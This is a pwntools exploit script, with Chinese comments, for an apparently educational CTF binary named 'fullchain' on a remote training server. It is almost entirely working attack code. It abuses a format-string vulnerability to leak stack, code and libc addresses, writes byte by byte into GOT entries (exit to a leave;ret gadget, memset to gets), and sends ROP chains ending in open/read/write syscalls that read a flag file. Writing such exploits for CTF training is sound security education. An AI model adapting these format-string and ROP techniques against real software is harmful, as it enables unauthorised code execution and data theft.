#!/usr/bin/python3
from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']



# r = process("./fullchain")
r = remote("edu-ctf.zoolab.org", 30201)
l = ELF("./fullchain")


# cnt 
def write_local(value):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(value)

def write_global(value):
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(value)



# 把cnt 寫大一點
def set_cnt(number = 1111):
    r.sendlineafter("local > ",b'local')
    # leak 出 local 
    r.sendlineafter("write > ",b'write%p')
    line = r.recvuntil("global")
    line = line.decode()
    print("line",line)
    local_stack_address = int(line[5:5+14],16)
    print("******local_stack_address",hex(local_stack_address))
    cnt_address = local_stack_address - 12
    print("cnt_address",hex(cnt_address))
    # line = r.recvline()
    # print("line",line)

    # 這邊是為了讓stack上面有cnt的位置,讓我們fmt的時候依靠這個位置寫到cnt
    # 所以直接在local上面寫cnt的位置
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(b'A'*0x10 + p64(cnt_address))

    # 這邊是最後一個cnt
    # 這邊因為字數的限制,所以只能寫5進入cnt 
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'write%16$n') 


    # 有了5個cnt,我們就可以先write fmt到global 在 printf
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    payload = '%{}c%16$n\x00'.format(number)
    print("payload",payload)
    r.sendline(payload.encode())


    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')

 

def leak_local_buffer_address():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(b"%p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    local_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("----local_buffer_address",hex(local_buffer_address))

    # local_buffer_offset =    0x7fffcae27000 - 0x7fffcae25160
    # code_base_address = local_buffer_address + local_buffer_offset

    # print("code_base_address",hex(code_base_address))
    return local_buffer_address

def leakCodeBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")


    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))

    global_buffer_offset =   0x56208192e0b0 - 0x56208192a000
    code_base_address = global_buffer_address - global_buffer_offset

    print("*****code_base_address",hex(code_base_address))
    return code_base_address

# r.sendlineafter("local > ",b'global')
def leakglobal_bufferAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))
    return global_buffer_address



def write_local(value):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)


def write_global(value):
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)




# 上面set_cnt有提到,先寫address到local在fmt
def fmt_write(addr,byte_value,num_of_byte=1):
    print("fmt addr",hex(addr),"byte_value",hex(byte_value))

    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(b'A'*0x10 + p64(addr))

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    if byte_value != 0:
        if num_of_byte== 1:
            payload = "%" + str(byte_value) + "c" + "%16$hhn\x00"
        elif num_of_byte == 2:
            payload = "%" + str(byte_value) + "c" + "%16$hn\x00"
        elif num_of_byte == 4:
            payload = "%" + str(byte_value) + "c" + "%16$n\x00"
    else:
        if num_of_byte== 1:
            payload = "%16$hhn\x00"
        elif num_of_byte == 2:
            payload = "%16$hn\x00"
        elif num_of_byte == 4:
            payload = "%16$n\x00"
    print("payload",payload)
    r.sendline(payload.encode())

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')

        
# fmt 一連串的字
def fmt_send_payload(start_address,payload):
    print("fmt_send_payload start_addr",hex(start_address),"payload",payload)
    for i in range(len(payload)):
        # if payload[i] == 0:
        #     continue
        # if i == 28:
        #     gdb.attach(r)
        print("-----fmt send payload")
        fmt_write(start_address+i,payload[i])
        print("address",hex(start_address+i),"i",i,"payload",hex(payload[i]))
    

# 這邊使用fmt一個一個char寫到chal()的 ret,串一個ROP chain,的到libc address
def leakLibC():
    puts_got = 0x4030 + code_base_address
    puts_plt = 0x1130 + code_base_address
    pop_rdi = 0x1863  + code_base_address
    chal= 0x15c7 + code_base_address

    print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))

    rop = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(chal)
    
    fmt_send_payload(stack_return_address,rop)
    # 將cnt寫成0 
    # fmt_write(cnt_address,0,4)
    r.sendlineafter("local >","exit")
    # libc = u64(r.recvuntil(b"global").split(b'\n')[1].ljust(8,b"\x00")) - 0x00000000000875a0
    libc = u64(r.recvuntil(b"global").split(b'\n')[0][-6:].ljust(8,b'\x00')) - 0x875a0
    print("libc",hex(libc))
    # ROP chain回來因為cnt會重設,所以我們也要重設cnt
    set_cnt()
    # reset cnt
    # fmt_write(cnt_address,11111,4)
    return libc
    

    # send_all_payload(stack_return_address,rop)
    
# 這邊因為每次使用rop chain,stack的位置會產生變化,所以每次rop chain回來後要更新位置

def setStackSymbolsAddress(local_buffer_address):
    cnt_address = local_buffer_address - 12
    ptr_address = local_buffer_address - 8
    stack_return_address = local_buffer_address + 0x28
    print("---- cnt_address",hex(cnt_address),"ptr_address",hex(ptr_address),"stack_return_address",hex(stack_return_address))
    return cnt_address , ptr_address , stack_return_address

elf = ELF('./fullchain')

# buffer_overflow_cnt()
set_cnt()
code_base_address = leakCodeBaseAddress()
local_buffer_address = leak_local_buffer_address()
cnt_address , ptr_address , stack_return_address = setStackSymbolsAddress(local_buffer_address)

exit_got = code_base_address + 0x4070
# ptr_address = stack_base_address + 

ret = 0x101a + code_base_address
# ret = code_base_address + 0x101a
ret= p64(ret)
leave_ret = p64(code_base_address + 0x147c)
puts_got = code_base_address + 0x4030
chal = p64(code_base_address + elf.sym['chal'])
print("chal",chal)
memset_got = code_base_address + elf.got['memset']
print("memset_got",hex(memset_got))

# fmt_write(exit_got,ret_gadget[0]) 
# fmt_write(exit_got+1,ret_gadget[1])

# 把exit_got寫成 leave_ret
# 使用這個來觸發ROP chain, 因為chal 可能因為優化的因素, compiler看到exit
# 就不編譯出leave ret, 所以我們用這替代

fmt_write(exit_got,leave_ret[0])
fmt_write(exit_got+1,leave_ret[1])

# r.sendlineafter("local > ",b'dummy')
# r.sendlineafter("write > ",b'rfdsjkead')
# r.sendlineafter("local > ",b'carry')
# # r.sendlineafter("write > ",b'xread')


# fmt_write(memset_got,ret[0])
# fmt_write(memset_got+1,ret[1])



# r.sendlineafter("local > ",b'carry')
# r.sendlineafter("write > ",b'fjsdkf')
libc = leakLibC()

print("******libc_address",hex(libc))
local_buffer_address = leak_local_buffer_address()
cnt_address , ptr_address , stack_return_address = setStackSymbolsAddress(local_buffer_address)

gets_address = libc + 0x86af0
print("gets_address",hex(gets_address))
gets_address = p64(gets_address)
print("memset_got",hex(memset_got))

# fmt_write(memset_got,gets_address[0])
# fmt_write(memset_got+1,gets_address[1])
fmt_send_payload(memset_got,gets_address)

# gdb.attach(r)

r.sendlineafter("local > ",b'local')
r.sendlineafter("write > ",b'set')
r.sendlineafter("data > ",b'1')
# 這邊後面加一個空白鍵 , 讓scanf繼續,如果是用sendlineafter 的話
# 雖然scanf會繼續,但是\n會留在裡面,所以接下來的gets會吃到\n而結束
r.sendafter("length > ",b'1 ')


pop_rsi_ret = 0x27529 + libc
pop_rdx_pop_rbx_ret = 0x162866   + libc
pop_rax_ret = 0x4a550  + libc
pop_rdi_ret = 0x26b72 + libc
syscall_ret = libc + 0x0000000000066229

payload = b"A"* 0x27

shall_string_address =  local_buffer_address + 0x30 + 21*0x8
payload += flat(

    pop_rdi_ret, shall_string_address,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    # chal

    pop_rdi_ret,3,
    pop_rsi_ret,local_buffer_address+0x8,
    pop_rdx_pop_rbx_ret,0x20,0,
    pop_rax_ret , 0,
    syscall_ret,

    pop_rdi_ret,1,
    pop_rax_ret,1,
    syscall_ret
)
payload += b"/home/fullchain/flag\x00"

r.sendline(payload)
r.sendlineafter("local >","exit")



r.interactive()

